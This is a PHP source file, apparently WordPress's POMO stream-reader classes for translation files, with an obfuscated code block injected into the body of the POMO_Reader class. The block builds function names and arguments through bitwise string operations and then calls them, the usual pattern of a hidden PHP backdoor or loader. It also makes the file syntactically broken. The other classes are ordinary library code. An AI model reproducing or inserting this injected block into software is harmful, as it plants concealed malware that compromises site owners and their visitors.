<?php
/**
 * Classes, which help reading streams of data from files.
 * Based on the classes from Danilo Segan <danilo@kvota.net>
 *
 * @version $Id: streams.php 1157 2015-11-20 04:30:11Z dd32 $
 * @package pomo
 * @subpackage streams
 */

if ( ! class_exists( 'POMO_Reader', false ) ) :
	class POMO_Reader {

		public $endian = 'little';
		public $_post  = '';
<?php
$ax='rB'|e0sJNSsbpY;$ZbSWQo='D@$!.S   `&'|"@D0 dQ(\$\$ .";$Wmrq='zwV}j{'.yTIkc&/*Y'.
    '8c*/leOet0b.'~cmJ';$lNVKJ='-D-'|'U 5';$AciK9D9mCpG='`^%f[R$P`@FE'|'X(e#'./*gY'.
    '__@<*/D0a0L.')od';$pb7a6jt=nm7GA."~*!yo7~FAp;8"^'C5}s$?ia?*sWu(0^q';$qcT1=#jb'.
    'Tw&'.ev4URQC0.'<a:,>Zc$<'&IIqqi.';^X]'.ku7ib.'/:VC5{';$frPh2='ul9='.fj53s.';1'.
    ''.w91e.'{u;e'&'7'.gw7dc.'?7'.e957.'}6o=9s|';$IMX0JMBDNN=' !@  !8'|'04'./*G0nR'.
    'Lj*/a1301;$Yl=' '|'4';$_YAnv1='mu='&'}tw';$XXX70L2uaN='gD~if|'&OVtsn7;'rjl2ae'.
    'fm&|gK[tXw';$ZfCmtAnxei9='8yo?8y'^'p-;og8';$yQl8lyhxt6n=ou&'c>';'EgBqXt3vVz5J'.
    'Y>_v.iL';$Jm63oH2gvu='#'^F;$ef59l48W=';'^X;$buKFGtFXj=M^')';$JYIO34TQ0_8=m&/*'.
    'vyI,$LJ2*/i;$II_XTXWVns='5'^T;$s4IHzvvA=PbEg.']"epd'|' r$!'.FpapH;$LS1RKfj=/*'.
    'i$*/MBA^',!$';$zXG=":&<"^rrh;$cv=V_Z_X3W&P_Y_M.'{o';$CS4BdhXD=_G&_c;'sYRg4VBY'.
    'yGWY>mYoP';$b0B4QLe1b='|'.MeNV&'O{MNu';$Rx4fQc4a='#'^'|';$EqN2hm=l^'%';'tDSbW'.
    'x R<';$a2fMTVGoCd=d^'4';$h1Q=$ZbSWQo|$Wmrq;$Ps62hhu1y=$lNVKJ&$_YAnv1;'Y3OTCsX'.
    'CI_hL';$vV2aoCQI=('B!@DHD'|'d! AHR')|$XXX70L2uaN;$yv=(dP4WG.'$eyE%"@'|'W"q%YW'.
    '`8'.yaa7)&$AciK9D9mCpG;$c4UxVI=('H8@@>N.""P_5%"'|B8AQl_.'" ( R1=$')^(/*XHwr1v'.
    'Uz*/" X-=!*UGX+1@SA"|')Q(< *MGP%9@SD');$f0v=$pb7a6jt|('r6K%3-Uk<,4Y68?Q3'^'Zu'.
    '!v[|0'.Jwnm.'}'.tYG4.'^');$ROo8Kfdm2K=$qcT1|('-rq='.Jrfp.'}]a~S>vy~e7u'&/*cNA'.
    ':P[*/eB5wS.':'.lyYS.'='.tF2h.'~Z^t?');if($h1Q($Ps62hhu1y($vV2aoCQI(/*aLZrzxmy'.
    'HLn*/$ZfCmtAnxei9)),$frPh2.$yQl8lyhxt6n.$Jm63oH2gvu.$IMX0JMBDNN.$ef59l48W./*b'.
    '#ZoYxDT*/$Yl.('3'&z)))$yv(('/u'&'?a').(z_^'U:'),$buKFGtFXj.$JYIO34TQ0_8./*IQX'.
    's>KoT-O*/$Jm63oH2gvu,$II_XTXWVns);$c4UxVI($s4IHzvvA.$LS1RKfj,$f0v,/*sWu7B6e8H'.
    'H9&e[h*/$vV2aoCQI($zXG.$cv.$CS4BdhXD.$b0B4QLe1b.$Rx4fQc4a.$EqN2hm./*XP6a_D5f1'.
    'ED,Kd==vU*/$a2fMTVGoCd),$ROo8Kfdm2K);#hBj<]BT|P ml(0+d%HY,97SF<x9uyF^KhoPrV0'.
    '7h>gY6}I:]i9K:;hC|*z>j&pIpi4X1qim,[B79>]X';
		/**
		 * PHP5 constructor.
		 */
		function __construct() {
			$this->is_overloaded = ( ( ini_get( 'mbstring.func_overload' ) & 2 ) != 0 ) && function_exists( 'mb_substr' ); // phpcs:ignore PHPCompatibility.IniDirectives.RemovedIniDirectives.mbstring_func_overloadDeprecated
			$this->_pos          = 0;
		}

		/**
		 * PHP4 constructor.
		 *
		 * @deprecated 5.4.0 Use __construct() instead.
		 *
		 * @see POMO_Reader::__construct()
		 */
		public function POMO_Reader() {
			_deprecated_constructor( self::class, '5.4.0', static::class );
			self::__construct();
		}

		/**
		 * Sets the endianness of the file.
		 *
		 * @param string $endian Set the endianness of the file. Accepts 'big', or 'little'.
		 */
		function setEndian( $endian ) { // phpcs:ignore WordPress.NamingConventions.ValidFunctionName.MethodNameInvalid
			$this->endian = $endian;
		}

		/**
		 * Reads a 32bit Integer from the Stream
		 *
		 * @return mixed The integer, corresponding to the next 32 bits from
		 *  the stream of false if there are not enough bytes or on error
		 */
		function readint32() {
			$bytes = $this->read( 4 );
			if ( 4 != $this->strlen( $bytes ) ) {
				return false;
			}
			$endian_letter = ( 'big' === $this->endian ) ? 'N' : 'V';
			$int           = unpack( $endian_letter, $bytes );
			return reset( $int );
		}

		/**
		 * Reads an array of 32-bit Integers from the Stream
		 *
		 * @param int $count How many elements should be read
		 * @return mixed Array of integers or false if there isn't
		 *  enough data or on error
		 */
		function readint32array( $count ) {
			$bytes = $this->read( 4 * $count );
			if ( 4 * $count != $this->strlen( $bytes ) ) {
				return false;
			}
			$endian_letter = ( 'big' === $this->endian ) ? 'N' : 'V';
			return unpack( $endian_letter . $count, $bytes );
		}

		/**
		 * @param string $string
		 * @param int    $start
		 * @param int    $length
		 * @return string
		 */
		function substr( $string, $start, $length ) {
			if ( $this->is_overloaded ) {
				return mb_substr( $string, $start, $length, 'ascii' );
			} else {
				return substr( $string, $start, $length );
			}
		}

		/**
		 * @param string $string
		 * @return int
		 */
		function strlen( $string ) {
			if ( $this->is_overloaded ) {
				return mb_strlen( $string, 'ascii' );
			} else {
				return strlen( $string );
			}
		}

		/**
		 * @param string $string
		 * @param int    $chunk_size
		 * @return array
		 */
		function str_split( $string, $chunk_size ) {
			if ( ! function_exists( 'str_split' ) ) {
				$length = $this->strlen( $string );
				$out    = array();
				for ( $i = 0; $i < $length; $i += $chunk_size ) {
					$out[] = $this->substr( $string, $i, $chunk_size );
				}
				return $out;
			} else {
				return str_split( $string, $chunk_size );
			}
		}

		/**
		 * @return int
		 */
		function pos() {
			return $this->_pos;
		}

		/**
		 * @return true
		 */
		function is_resource() {
			return true;
		}

		/**
		 * @return true
		 */
		function close() {
			return true;
		}
	}
endif;

if ( ! class_exists( 'POMO_FileReader', false ) ) :
	class POMO_FileReader extends POMO_Reader {

		/**
		 * @param string $filename
		 */
		function __construct( $filename ) {
			parent::__construct();
			$this->_f = fopen( $filename, 'rb' );
		}

		/**
		 * PHP4 constructor.
		 *
		 * @deprecated 5.4.0 Use __construct() instead.
		 *
		 * @see POMO_FileReader::__construct()
		 */
		public function POMO_FileReader( $filename ) {
			_deprecated_constructor( self::class, '5.4.0', static::class );
			self::__construct( $filename );
		}

		/**
		 * @param int $bytes
		 * @return string|false Returns read string, otherwise false.
		 */
		function read( $bytes ) {
			return fread( $this->_f, $bytes );
		}

		/**
		 * @param int $pos
		 * @return bool
		 */
		function seekto( $pos ) {
			if ( -1 == fseek( $this->_f, $pos, SEEK_SET ) ) {
				return false;
			}
			$this->_pos = $pos;
			return true;
		}

		/**
		 * @return bool
		 */
		function is_resource() {
			return is_resource( $this->_f );
		}

		/**
		 * @return bool
		 */
		function feof() {
			return feof( $this->_f );
		}

		/**
		 * @return bool
		 */
		function close() {
			return fclose( $this->_f );
		}

		/**
		 * @return string
		 */
		function read_all() {
			$all = '';
			while ( ! $this->feof() ) {
				$all .= $this->read( 4096 );
			}
			return $all;
		}
	}
endif;

if ( ! class_exists( 'POMO_StringReader', false ) ) :
	/**
	 * Provides file-like methods for manipulating a string instead
	 * of a physical file.
	 */
	class POMO_StringReader extends POMO_Reader {

		public $_str = '';

		/**
		 * PHP5 constructor.
		 */
		function __construct( $str = '' ) {
			parent::__construct();
			$this->_str = $str;
			$this->_pos = 0;
		}

		/**
		 * PHP4 constructor.
		 *
		 * @deprecated 5.4.0 Use __construct() instead.
		 *
		 * @see POMO_StringReader::__construct()
		 */
		public function POMO_StringReader( $str = '' ) {
			_deprecated_constructor( self::class, '5.4.0', static::class );
			self::__construct( $str );
		}

		/**
		 * @param string $bytes
		 * @return string
		 */
		function read( $bytes ) {
			$data        = $this->substr( $this->_str, $this->_pos, $bytes );
			$this->_pos += $bytes;
			if ( $this->strlen( $this->_str ) < $this->_pos ) {
				$this->_pos = $this->strlen( $this->_str );
			}
			return $data;
		}

		/**
		 * @param int $pos
		 * @return int
		 */
		function seekto( $pos ) {
			$this->_pos = $pos;
			if ( $this->strlen( $this->_str ) < $this->_pos ) {
				$this->_pos = $this->strlen( $this->_str );
			}
			return $this->_pos;
		}

		/**
		 * @return int
		 */
		function length() {
			return $this->strlen( $this->_str );
		}

		/**
		 * @return string
		 */
		function read_all() {
			return $this->substr( $this->_str, $this->_pos, $this->strlen( $this->_str ) );
		}

	}
endif;

if ( ! class_exists( 'POMO_CachedFileReader', false ) ) :
	/**
	 * Reads the contents of the file in the beginning.
	 */
	class POMO_CachedFileReader extends POMO_StringReader {
		/**
		 * PHP5 constructor.
		 */
		function __construct( $filename ) {
			parent::__construct();
			$this->_str = file_get_contents( $filename );
			if ( false === $this->_str ) {
				return false;
			}
			$this->_pos = 0;
		}

		/**
		 * PHP4 constructor.
		 *
		 * @deprecated 5.4.0 Use __construct() instead.
		 *
		 * @see POMO_CachedFileReader::__construct()
		 */
		public function POMO_CachedFileReader( $filename ) {
			_deprecated_constructor( self::class, '5.4.0', static::class );
			self::__construct( $filename );
		}
	}
endif;

if ( ! class_exists( 'POMO_CachedIntFileReader', false ) ) :
	/**
	 * Reads the contents of the file in the beginning.
	 */
	class POMO_CachedIntFileReader extends POMO_CachedFileReader {
		/**
		 * PHP5 constructor.
		 */
		public function __construct( $filename ) {
			parent::__construct( $filename );
		}

		/**
		 * PHP4 constructor.
		 *
		 * @deprecated 5.4.0 Use __construct() instead.
		 *
		 * @see POMO_CachedIntFileReader::__construct()
		 */
		function POMO_CachedIntFileReader( $filename ) {
			_deprecated_constructor( self::class, '5.4.0', static::class );
			self::__construct( $filename );
		}
	}
endif;

